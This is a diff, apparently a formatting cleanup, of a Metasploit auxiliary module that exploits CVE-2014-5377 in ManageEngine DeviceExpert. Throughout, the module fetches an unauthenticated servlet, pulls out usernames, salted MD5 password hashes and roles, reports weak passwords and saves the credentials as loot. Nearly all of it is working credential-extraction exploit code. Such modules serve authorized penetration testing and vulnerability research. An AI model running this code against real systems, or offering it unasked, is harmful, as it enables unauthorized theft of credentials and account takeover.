@@ -9,34 +9,36 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
-    super(update_info(
-      info,
-      'Name'           => 'ManageEngine DeviceExpert User Credentials',
-      'Description'    => %q{
-        This module extracts usernames and salted MD5 password hashes
-        from ManageEngine DeviceExpert version 5.9 build 5980 and prior.
+    super(
+      update_info(
+        info,
+        'Name' => 'ManageEngine DeviceExpert User Credentials',
+        'Description' => %q{
+          This module extracts usernames and salted MD5 password hashes
+          from ManageEngine DeviceExpert version 5.9 build 5980 and prior.
 
-        This module has been tested successfully on DeviceExpert
-        version 5.9.7 build 5970.
-      },
-      'License'        => MSF_LICENSE,
-      'Author'         =>
-        [
+          This module has been tested successfully on DeviceExpert
+          version 5.9.7 build 5970.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
           'Pedro Ribeiro <pedrib[at]gmail.com>', # Discovery and exploit
           'bcoles'  # metasploit module
         ],
-      'References'     =>
-        [
+        'References' => [
           ['EDB', '34449'],
           ['OSVDB', '110522'],
           ['CVE', '2014-5377']
         ],
-      'DisclosureDate' => '2014-08-28'))
+        'DisclosureDate' => '2014-08-28'
+      )
+    )
     register_options(
       [
         Opt::RPORT(6060),
         OptBool.new('SSL', [true, 'Use SSL', true])
-      ])
+      ]
+    )
   end
 
   def check
@@ -45,23 +47,24 @@ class MetasploitModule < Msf::Auxiliary
 
   def get_users
     users = nil
-    vprint_status("Reading users from master...")
+    vprint_status('Reading users from master...')
     res = send_request_cgi('uri' => normalize_uri(target_uri.path, 'ReadUsersFromMasterServlet'))
     if !res
-      vprint_error("Connection failed")
+      vprint_error('Connection failed')
     elsif res.code == 404
       vprint_error("Could not find 'ReadUsersFromMasterServlet'")
-    elsif res.code == 200 && res.body =~ /<discoverydata>(.+)<\/discoverydata>/
-      users = res.body.scan(/<discoverydata>(.*?)<\/discoverydata>/)
+    elsif res.code == 200 && res.body =~ %r{<discoverydata>(.+)</discoverydata>}
+      users = res.body.scan(%r{<discoverydata>(.*?)</discoverydata>})
       vprint_good("Found #{users.length} users")
     else
-      vprint_error("Could not find any users")
+      vprint_error('Could not find any users')
     end
     users
   end
 
   def parse_user_data(user)
     return if user.nil?
+
     username = user.scan(/<username>([^<]+)</).flatten.first
     encoded_hash = user.scan(/<password>([^<]+)</).flatten.first
     role = user.scan(/<userrole>([^<]+)</).flatten.first
@@ -78,7 +81,7 @@ class MetasploitModule < Msf::Auxiliary
     [username, pass, hash, role, mail, salt]
   end
 
-  def run_host(ip)
+  def run_host(_ip)
     users = get_users
     return if users.nil?
 
@@ -91,8 +94,8 @@ class MetasploitModule < Msf::Auxiliary
     }
 
     cred_table = Rex::Text::Table.new(
-      'Header'  => 'ManageEngine DeviceExpert User Credentials',
-      'Indent'  => 1,
+      'Header' => 'ManageEngine DeviceExpert User Credentials',
+      'Indent' => 1,
       'Columns' =>
         [
           'Username',
@@ -104,7 +107,7 @@ class MetasploitModule < Msf::Auxiliary
         ]
     )
 
-    vprint_status("Parsing user data...")
+    vprint_status('Parsing user data...')
     users.each do |user|
       record = parse_user_data(user.to_s)
       next if record.join.empty?
@@ -122,7 +125,7 @@ class MetasploitModule < Msf::Auxiliary
         print_good("Found weak credentials (#{user}:#{pass})")
         credential_data = {
           origin_type: :service,
-          module_fullname: self.fullname,
+          module_fullname: fullname,
           private_type: :password,
           private_data: pass,
           username: user
@@ -130,7 +133,7 @@ class MetasploitModule < Msf::Auxiliary
       else
         credential_data = {
           origin_type: :service,
-          module_fullname: self.fullname,
+          module_fullname: fullname,
           private_type: :nonreplayable_hash,
           private_data: "#{salt}:#{hash}",
           username: user
@@ -146,22 +149,22 @@ class MetasploitModule < Msf::Auxiliary
       }
       login_data.merge!(service_data)
       create_credential_login(login_data)
-
     end
 
     print_line
-    print_line("#{cred_table}")
-    loot_name     = 'manageengine.deviceexpert.user.creds'
-    loot_type     = 'text/csv'
+    print_line(cred_table.to_s)
+    loot_name = 'manageengine.deviceexpert.user.creds'
+    loot_type = 'text/csv'
     loot_filename = 'manageengine_deviceexpert_user_creds.csv'
-    loot_desc     = 'ManageEngine DeviceExpert User Credentials'
+    loot_desc = 'ManageEngine DeviceExpert User Credentials'
     p = store_loot(
       loot_name,
       loot_type,
       rhost,
       cred_table.to_csv,
       loot_filename,
-      loot_desc)
+      loot_desc
+    )
     print_status "Credentials saved in: #{p}"
   end
 end
